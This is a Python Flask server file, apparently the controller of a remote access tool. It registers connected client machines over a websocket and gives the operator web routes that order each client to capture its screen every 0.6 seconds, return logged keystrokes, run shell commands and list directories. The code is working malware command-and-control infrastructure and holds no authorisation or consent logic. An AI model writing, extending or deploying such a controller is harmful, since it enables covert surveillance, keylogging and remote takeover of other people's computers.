import base64
import datetime
import json
import lzma
import sys
from flask import Flask, jsonify, request, render_template
from flask_sockets import Sockets
from tempfile import NamedTemporaryFile
import time
import threading

app = Flask(__name__)
sockets = Sockets(app)
cache = {}


class MSG:
    def __init__(self, ws):
        """
        存放客户端，用于后期收发消息加锁
        :param ws:
        """
        self.lock = threading.RLock()
        self.ws = ws

    def get_data(self, data: dict) -> dict:
        wait_data = json.dumps(data)
        _data = {}
        self.lock.acquire()
        try:
            self.ws.send(wait_data)
            _data = self.ws.receive()
        except Exception as e:
            pass
        finally:
            self.lock.release()
            pass
        return json.loads(_data)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api.json')
def api():
    return jsonify({"code": 0, "data": [{"uid": i, "system": cache[i][1], "disk": cache[i][2], "uptime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} for i in cache.keys()]})


@sockets.route("/ping")
def ping(ws):
    msg = json.loads(ws.receive())
    uid = msg['uid']
    cache.update({uid: [MSG(ws), msg["system"], msg["disk"]]})
    try:
        while not ws.closed:
            time.sleep(10)
    except Exception as e:
        pass
    finally:
        cache.pop(uid)
        print("close..")


@app.route('/capture/<uid>', methods=['GET', 'POST'])
def capture(uid):
    if request.method == "GET":
        return render_template('capture.html', speed=0.6)  # 0.6秒抓取一次屏幕
    else:
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "capture"})
        return jsonify(_data)


@app.route('/key/<uid>', methods=['GET', 'POST'])
def key(uid):
    _data = cache[uid][0].get_data({"v_uid": "0222", "type": "key"})
    code = base64.b64decode(_data["data"]).decode()
    return render_template('key.html', code=code)


@app.route('/shell/<uid>', methods=['GET', 'POST'])
def shell(uid):
    if request.method == "GET":
        return render_template('shell.html')
    else:
        _key = json.loads(request.data.decode())["data"]
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "shell", "data": _key})
        return jsonify(_data)


@app.route('/file/<uid>', methods=['GET', 'POST'])
def file(uid):
    if request.method == "GET":
        return render_template('file.html', disk_root=[{"title": e_disk_path, "id": e_disk_path} for e_disk_path in cache[uid][2]])
    else:
        _dir = request.form.get("dir")
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "dir", "data": _dir})
        return jsonify({"code": 0, "data": _data["raw"]})


if __name__ == '__main__':
    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    from gevent import monkey

    monkey.patch_all()
    server = pywsgi.WSGIServer(('0.0.0.0', 5000), app, handler_class=WebSocketHandler)
    print("server run at", "http://127.0.0.1:5000")
    try:
        server.serve_forever()
    except KeyboardInterrupt as e:
        server.stop()
        sys.exit()
